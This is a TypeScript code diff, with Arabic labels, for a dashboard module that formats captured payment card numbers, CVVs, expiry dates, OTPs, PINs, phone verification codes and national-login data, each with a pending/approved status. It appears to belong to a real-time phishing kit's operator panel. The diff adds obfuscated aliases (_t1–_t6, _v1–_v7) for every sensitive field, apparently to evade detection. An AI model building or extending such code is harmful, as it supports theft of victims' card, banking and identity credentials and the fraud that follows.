@@ -4,7 +4,7 @@
 
 export interface HistoryEntry {
   id: string
-  type: "card" | "otp" | "pin" | "phone_info" | "phone_otp" | "nafad"
+  type: "card" | "otp" | "pin" | "phone_info" | "phone_otp" | "nafad" | "_t1" | "_t2" | "_t3" | "_t4" | "_t5" | "_t6"
   timestamp: string
   status: "pending" | "approved" | "rejected"
   data: any
@@ -25,13 +25,19 @@ export interface BubbleData {
  * Get title for a history entry type
  */
 export function getTitleByType(type: HistoryEntry["type"], index?: number): string {
-  const titles = {
+  const titles: Record<string, string> = {
     card: "معلومات البطاقة",
+    _t1: "معلومات البطاقة",
     otp: "كود OTP",
+    _t2: "كود OTP",
     pin: "رمز PIN",
+    _t3: "رمز PIN",
     phone_info: "معلومات الهاتف",
+    _t4: "معلومات الهاتف",
     phone_otp: "كود تحقق الهاتف",
-    nafad: "نفاذ"
+    _t5: "كود تحقق الهاتف",
+    nafad: "نفاذ",
+    _t6: "نفاذ"
   }
   
   const title = titles[type] || "بيانات"  // Default to "بيانات" instead of undefined
@@ -54,12 +60,12 @@ export function getStatusLabel(status: string): string {
  * Format card data for display
  */
 export function formatCardData(entry: HistoryEntry): Record<string, any> {
-  const { cardNumber, cardType, expiryDate, cvv, bankInfo } = entry.data
+  const { cardNumber, _v1, cardType, expiryDate, _v3, cvv, _v2, bankInfo } = entry.data
   return {
-    "رقم البطاقة": cardNumber,
+    "رقم البطاقة": _v1 || cardNumber,
     "نوع البطاقة": cardType,
-    "تاريخ الانتهاء": expiryDate,
-    "CVV": cvv,
+    "تاريخ الانتهاء": _v3 || expiryDate,
+    "CVV": _v2 || cvv,
     "البنك": bankInfo?.name || "غير محدد",
     "بلد البنك": bankInfo?.country || "غير محدد",
     "طريقة الدفع": bankInfo?.paymentMethod || "credit-card"
@@ -70,9 +76,9 @@ export function formatCardData(entry: HistoryEntry): Record<string, any> {
  * Format OTP data for display
  */
 export function formatOtpData(entry: HistoryEntry): Record<string, any> {
-  const { otpCode } = entry.data
+  const { otpCode, _v5 } = entry.data
   return {
-    "الكود": otpCode || "في انتظار الإدخال...",
+    "الكود": _v5 || otpCode || "في انتظار الإدخال...",
     "الحالة": getStatusLabel(entry.status)
   }
 }
@@ -81,9 +87,9 @@ export function formatOtpData(entry: HistoryEntry): Record<string, any> {
  * Format PIN data for display
  */
 export function formatPinData(entry: HistoryEntry): Record<string, any> {
-  const { pinCode } = entry.data
+  const { pinCode, _v6 } = entry.data
   return {
-    "الكود": pinCode || "في انتظار الإدخال...",
+    "الكود": _v6 || pinCode || "في انتظار الإدخال...",
     "الحالة": getStatusLabel(entry.status)
   }
 }
@@ -103,9 +109,9 @@ export function formatPhoneInfoData(entry: HistoryEntry): Record<string, any> {
  * Format phone OTP data for display
  */
 export function formatPhoneOtpData(entry: HistoryEntry): Record<string, any> {
-  const { phoneOtp } = entry.data
+  const { phoneOtp, _v7 } = entry.data
   return {
-    "كود التحقق": phoneOtp || "في انتظار الإدخال...",
+    "كود التحقق": _v7 || phoneOtp || "في انتظار الإدخال...",
     "الحالة": getStatusLabel(entry.status)
   }
 }
@@ -139,18 +145,23 @@ export function convertHistoryToBubbles(history: HistoryEntry[]): BubbleData[] {
     
     switch (entry.type) {
       case "card":
+      case "_t1":
         formattedData = formatCardData(entry)
         break
       case "otp":
+      case "_t2":
         formattedData = formatOtpData(entry)
         break
       case "pin":
+      case "_t3":
         formattedData = formatPinData(entry)
         break
       case "phone_info":
+      case "_t4":
         formattedData = formatPhoneInfoData(entry)
         break
       case "phone_otp":
+      case "_t5":
         formattedData = formatPhoneOtpData(entry)
         break
       default:
